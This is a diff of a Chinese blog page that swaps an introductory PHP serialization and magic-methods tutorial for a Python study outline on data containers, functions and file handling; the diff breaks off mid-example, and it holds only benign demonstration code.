@@ -151,7 +151,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">42</span>
+          <span class="site-state-item-count">43</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -203,7 +203,7 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://monkeyx1.github.io/2022/10/02/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F/">
+    <link itemprop="mainEntityOfPage" href="https://monkeyx1.github.io/2022/10/02/Python%E5%AD%A6%E4%B9%A0-%E4%BA%8C/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/header.jpg">
@@ -221,7 +221,7 @@
     </span>
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
-          <a href="/2022/10/02/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F/" class="post-title-link" itemprop="url">反序列化从入门到入土</a>
+          <a href="/2022/10/02/Python%E5%AD%A6%E4%B9%A0-%E4%BA%8C/" class="post-title-link" itemprop="url">Python学习(二)</a>
         </h2>
 
         <div class="post-meta-container">
@@ -232,7 +232,7 @@
       </span>
       <span class="post-meta-item-text">发表于</span>
 
-      <time title="创建时间：2022-10-02 12:26:48" itemprop="dateCreated datePublished" datetime="2022-10-02T12:26:48+08:00">2022-10-02</time>
+      <time title="创建时间：2022-10-02 21:15:00" itemprop="dateCreated datePublished" datetime="2022-10-02T21:15:00+08:00">2022-10-02</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -247,12 +247,12 @@
       </span>
       <span class="post-meta-item-text">分类于</span>
         <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/" itemprop="url" rel="index"><span itemprop="name">web安全学习</span></a>
+          <a href="/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0/" itemprop="url" rel="index"><span itemprop="name">编程语言学习</span></a>
         </span>
     </span>
 
   
-    <span id="/2022/10/02/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F/" class="post-meta-item leancloud_visitors" data-flag-title="反序列化从入门到入土" title="阅读次数">
+    <span id="/2022/10/02/Python%E5%AD%A6%E4%B9%A0-%E4%BA%8C/" class="post-meta-item leancloud_visitors" data-flag-title="Python学习(二)" title="阅读次数">
       <span class="post-meta-item-icon">
         <i class="far fa-eye"></i>
       </span>
@@ -265,14 +265,14 @@
         <i class="far fa-file-word"></i>
       </span>
       <span class="post-meta-item-text">本文字数：</span>
-      <span>10k</span>
+      <span>3.9k</span>
     </span>
     <span class="post-meta-item" title="阅读时长">
       <span class="post-meta-item-icon">
         <i class="far fa-clock"></i>
       </span>
       <span class="post-meta-item-text">阅读时长 &asymp;</span>
-      <span>9 分钟</span>
+      <span>4 分钟</span>
     </span>
 </div>
 
@@ -283,187 +283,447 @@
     
     
     <div class="post-body" itemprop="articleBody">
-          <h2 id="序列化的概念"><a href="#序列化的概念" class="headerlink" title="序列化的概念"></a>序列化的概念</h2><p>官方话：将对象或数组转换为可存储的字符串</p>
-<p>我的理解：游戏的存档</p>
-<p>在PHP中我们会使用<code>serialize()</code>函数来序列化对象或数组，将其转换为可存储的字符串</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">// 定义一个类 </span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&quot;monkey&quot;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$age</span> = <span class="number">20</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$a</span> = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span> -&gt; name; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 实例化对象 </span></span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 序列化对象 </span></span><br><span class="line"><span class="variable">$se</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$test</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 返回序列化后的结果 </span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$se</span>);</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>返回的结果：</p>
-</blockquote>
-<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">string(75) &quot;O:4:&quot;Test&quot;:3:&#123;s:4:&quot;name&quot;;s:6:&quot;monkey&quot;;s:6:&quot;\000*\000age&quot;;i:20;s:7:&quot;\000Test\000a&quot;;b:0;&#125;</span><br></pre></td></tr></table></figure>
-
+          <h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><ul>
+<li>python数据容器<ul>
+<li>数据容器入门</li>
+<li>数据容器：list（列表）</li>
+<li>list的遍历</li>
+<li>数据容器：tuple（元组）</li>
+<li>数据容器：str（字符串）</li>
+<li>数据容器的切片</li>
+<li>数据容器：set（集合）</li>
+<li>数据容器：dict（字典、映射）</li>
+<li>数据容器的通用操作</li>
+</ul>
+</li>
+<li>python函数进阶<ul>
+<li>函数的多返回值</li>
+<li>函数的多种传参方式</li>
+<li>匿名函数</li>
+</ul>
+</li>
+<li>python的文件操作<ul>
+<li>文件的编码</li>
+<li>文件的读取</li>
+<li>文件的写入</li>
+<li>文件的追加</li>
+</ul>
+</li>
+</ul>
+<h2 id="python数据容器"><a href="#python数据容器" class="headerlink" title="python数据容器"></a>python数据容器</h2><h4 id="数据容器入门"><a href="#数据容器入门" class="headerlink" title="数据容器入门"></a>数据容器入门</h4><ul>
+<li>python数据类型：一种可以容纳多份数据的数据类型，容纳的每一份数据称之为1个元素，每一个元素，可以是任意类型的数据，如字符串、数字、布尔等。</li>
+<li>数据容器根据特点的不同进行分类<ul>
+<li>是否支持重复元素</li>
+<li>是否可以修改</li>
+<li>是否有序</li>
+</ul>
+</li>
+<li>数据容器的五类：<ul>
+<li>列表（list）、元组（tuple）、字符串（str）、集合（set）、字典（dict）</li>
+</ul>
+</li>
+</ul>
+<h4 id="数据容器：list（列表）"><a href="#数据容器：list（列表）" class="headerlink" title="数据容器：list（列表）"></a>数据容器：list（列表）</h4><ul>
+<li>列表的定义<ul>
+<li>列表内的每一个数据，称之为元素</li>
+<li>以<code>[]</code>作为标识</li>
+<li>列表内每一个元素之间用<code>,</code>隔开</li>
+<li>列表可以一个存储多个数据，且可以为不同的数据类型，支持嵌套。</li>
+</ul>
+</li>
+</ul>
+<p><img src="/images/Python%E5%AD%A6%E4%B9%A0-%E4%BA%8C/image-168-1024x546.png"></p>
 <ul>
-<li><code>O:4:&quot;Test&quot;:3</code>：O表示的是对象类型；4是对象名称的长度；Test是对象名；3表示该对象中的属性个数</li>
-<li><code>s:4:&quot;name&quot;;s:6:&quot;monkey&quot;</code>：前面的s表示变量名称是字符串类型；name是变量的名称；后面的s表示变量值是字符串类型；monkey表示变量值。</li>
-<li><code>s:6:&quot;\000*\000age&quot;;i:20</code>：这里为什么是6呢？而且还多了两个<code>\000</code>，这是因为这里成员变量使用的是<code>protected</code>，protected属性序列化的时候格式是 %00%00成员名；后面的i表示的是整数型。</li>
-<li><code>s:7:&quot;\000Test\000a&quot;;b:0</code>：成员变量使用的属性是<code>private</code>，private属性序列化的时候格式是<code>%00类名%00成员名</code>；b表示的布尔类型。</li>
-<li>这里只有属性，没有方法，这是因为序列化函数只对类的属性进行序列化，不对方法进行序列化。</li>
+<li>列表的下标索引</li>
 </ul>
-<h2 id="反序列化的概念"><a href="#反序列化的概念" class="headerlink" title="反序列化的概念"></a>反序列化的概念</h2><p>官方话：将序列化后的字符串转换回对象或者数组。</p>
-<p>我的理解：游戏的读档。</p>
-<p>在PHP中我们使用unserialize()函数来将序列化后的字符串转换回PHP的值。</p>
-<p>然后我们构造反序列化的代码</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;O:4:&quot;Test&quot;:3:&#123;s:4:&quot;name&quot;;s:6:&quot;monkey&quot;;s:6:&quot; * age&quot;;i:20;s:7:&quot; Test a&quot;;b:0;&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span> -&gt; name;</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F/image-5-1024x544.png" alt="img"></p>
-<p>这里并不是打印了类的对象和成员变量name的值，因为在反序列化的时候要保证有该类存在，因为序列化是不序列化方法的，所以反序列化的时候还要依靠该类进行。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&quot;monkey&quot;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$age</span> = <span class="number">20</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$a</span> = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    	<span class="keyword">echo</span> <span class="variable language_">$this</span> -&gt; name; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;O:4:&quot;Test&quot;:3:&#123;s:4:&quot;name&quot;;s:6:&quot;monkey&quot;;s:6:&quot; * age&quot;;i:20;s:7:&quot; Test a&quot;;b:0;&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span> -&gt; name;</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F/image-6-1024x546.png" alt="img"></p>
-<h2 id="反序列化漏洞的产生"><a href="#反序列化漏洞的产生" class="headerlink" title="反序列化漏洞的产生"></a>反序列化漏洞的产生</h2><p>反序列化漏洞其实就是由于<code>unserialize</code>函数接收到了用户传入的恶意的序列化数据篡改了成员属性而导致的漏洞。</p>
-<h2 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h2><ul>
-<li>__construct()，类的构造函数</li>
-<li>__destruct()，类的析构函数</li>
-<li>__call()，在对象中调用一个不可访问方法时调用</li>
-<li>__callStatic()，用静态方式中调用一个不可访问方法时调用</li>
-<li>__get()，获得一个类的成员变量时调用</li>
-<li>__set()，设置一个类的成员变量时调用</li>
-<li>__isset()，当对不可访问属性调用isset()或empty()时调用</li>
-<li>__unset()，当对不可访问属性调用unset()时被调用。</li>
-<li>__sleep()，执行serialize()时，先会调用这个函数</li>
-<li>__wakeup()，执行unserialize()时，先会调用这个函数</li>
-<li>__toString()，类被当成字符串时的回应方法</li>
-<li>__invoke()，调用函数的方式调用一个对象时的回应方法</li>
-<li>__set_state()，调用var_export()导出类时，此静态方法会被调用。</li>
-<li>__clone()，当对象复制完成时调用</li>
-<li>__autoload()，尝试加载未定义的类</li>
-<li>__debugInfo()，打印所需调试信息</li>
+<p><img src="/images/Python%E5%AD%A6%E4%B9%A0-%E4%BA%8C/image-170-1024x542.png"><img src="/images/Python%E5%AD%A6%E4%B9%A0-%E4%BA%8C/image-171-1024x543.png"></p>
+<ul>
+<li>列表的常用操作方法<ul>
+<li><p>方法和函数功能一样，有传入参数，有返回值，只是方法的使用格式不同</p>
+<ul>
+<li>方法的使用：student &#x3D; Student()<br>num &#x3D; student.add(1, 2)</li>
 </ul>
-<h4 id="魔术方法详解"><a href="#魔术方法详解" class="headerlink" title="魔术方法详解"></a>魔术方法详解</h4><p>__construct()：该方法被称为构造方法。就是当一个对象被实例化的时候，首先会去执行的方法，但是在序列化和反序列化的时候是不会去触发的。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">// 定义一个类 </span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span></span>) </span>&#123;</span><br><span class="line">    	<span class="variable language_">$this</span> -&gt; name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;__construct is OK&quot;</span>; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">Test</span>(<span class="string">&#x27;monkey&#x27;</span>);</span><br><span class="line"><span class="variable">$se</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$test</span>);</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$se</span>);</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F/image-7-1024x118.png" alt="img"></p>
-<p>__destruct()：当某个对象的所有引用都被删除或者对象被销毁的时候执行的魔术方法。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">// 定义一个类 </span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    	<span class="comment">// <span class="doctag">TODO:</span> Implement __destruct() method. </span></span><br><span class="line">    	<span class="keyword">echo</span> <span class="string">&quot;__destruct is OK&quot;</span>; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line"><span class="variable">$se</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$test</span>);</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$se</span>);</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F/image-8-1024x103.png" alt="img"></p>
-<p>这里触发了两次是因为第一次实例化的时候会触发一次，另外一次就是反序列化后生成的对象触发的。</p>
-<p>__call()：在对象中调用不可访问方法时会调用<code>__call()</code>魔术方法。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">// 定义一个类 </span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="comment">// $arguments变量是一个数组 </span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$arguments</span></span>) </span>&#123;</span><br><span class="line">        <span class="comment">// <span class="doctag">TODO:</span> Implement __call() method. </span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$name</span>,<span class="subst">$arguments</span>[0]&quot;</span>; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line"><span class="variable">$test</span> -&gt; <span class="title function_ invoke__">test</span>(<span class="string">&#x27;123&#x27;</span>);</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F/image-9-1024x109.png" alt="img"></p>
-<p>__callStatic()：在静态上下文中调用一个不可访问方法时会被调用。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 定义一个类 </span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="comment">// $arguments是一个数组 </span></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">__callStatic</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$arguments</span></span>) </span>&#123;</span><br><span class="line">        <span class="comment">// <span class="doctag">TODO:</span> Implement __callStatic() method. </span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$name</span>,<span class="subst">$arguments</span>[0]&quot;</span>; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line"><span class="comment">/* * 双冒号也叫范围解析操作符，可以用于访问静态成员、类常量，还可以用于覆盖类中的属性和方法。 */</span> </span><br><span class="line"><span class="variable">$test</span>::<span class="title function_ invoke__">test</span>(<span class="string">&quot;123&quot;</span>);</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F/image-10-1024x104.png" alt="img"></p>
-<p>__get()：读取不可访问属性的值时调用。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 定义一个类 </span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>) </span>&#123;</span><br><span class="line">        <span class="comment">// <span class="doctag">TODO:</span> Implement __get() method. </span></span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$name</span>; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">Test</span>(); </span><br><span class="line"><span class="variable">$test</span> -&gt; age;</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F/image-11-1024x107.png" alt="img"></p>
-<p>__set()：给不可访问的属性赋值时会调用。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">// 定义一个类 </span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$value</span></span>) </span>&#123;</span><br><span class="line">        <span class="comment">// <span class="doctag">TODO:</span> Implement __set() method. </span></span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$name</span>.<span class="string">&quot;,&quot;</span>.<span class="variable">$value</span>; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">Test</span>(); </span><br><span class="line"><span class="variable">$test</span> -&gt; age = <span class="number">18</span>;</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F/image-12-1024x111.png" alt="img"></p>
-<p>__set和__get是不一样的，一个只是访问，一个是要进行赋值。</p>
-<p>__isset()：对不可访问属性（属性是private或者不存在）调用isset()或者empty()时调用。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">// 定义一个类 </span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123; </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>; </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__isset</span>(<span class="params"><span class="variable">$name</span></span>) </span>&#123;</span><br><span class="line">        <span class="comment">// <span class="doctag">TODO:</span> Implement __isset() method.</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$name</span>; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line"><span class="keyword">isset</span>(<span class="variable">$test</span> -&gt; age);</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F/image-13-1024x114.png" alt="img"></p>
-<p>__unset()：对不可访问的属性调用unset()时会调用。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 定义一个类 </span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123; </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unset</span>(<span class="params"><span class="variable">$name</span></span>) </span>&#123;</span><br><span class="line">        <span class="comment">// <span class="doctag">TODO:</span> Implement __unset() method. </span></span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$name</span>; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line"><span class="keyword">unset</span>(<span class="variable">$test</span> -&gt; age);</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F/image-14-1024x109.png" alt="img"></p>
-<p>__sleep()：serialize()函数会检查是否存在__sleep()魔术方法，如果存在，该方法会先被调用，然后才执行序列化操作。此功能用于清理对象，并返回一个包含对象中所有被序列化的变量名称的数组。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 定义一个类 </span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123; </span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">SITE</span> = <span class="string">&#x27;name&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$pass</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$age</span>, <span class="variable">$pass</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span> -&gt; name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="variable language_">$this</span> -&gt; age = <span class="variable">$age</span>; </span><br><span class="line">        <span class="variable language_">$this</span> -&gt; pass = <span class="variable">$pass</span>;</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="comment">// <span class="doctag">TODO:</span> Implement __sleep() method.</span></span><br><span class="line">        <span class="comment">// 返回需要序列化的变量名，过滤了pass变量 </span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">&#x27;name&#x27;</span>,<span class="string">&#x27;age&#x27;</span>); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">Test</span>(<span class="string">&#x27;monkey&#x27;</span>,<span class="number">18</span>, <span 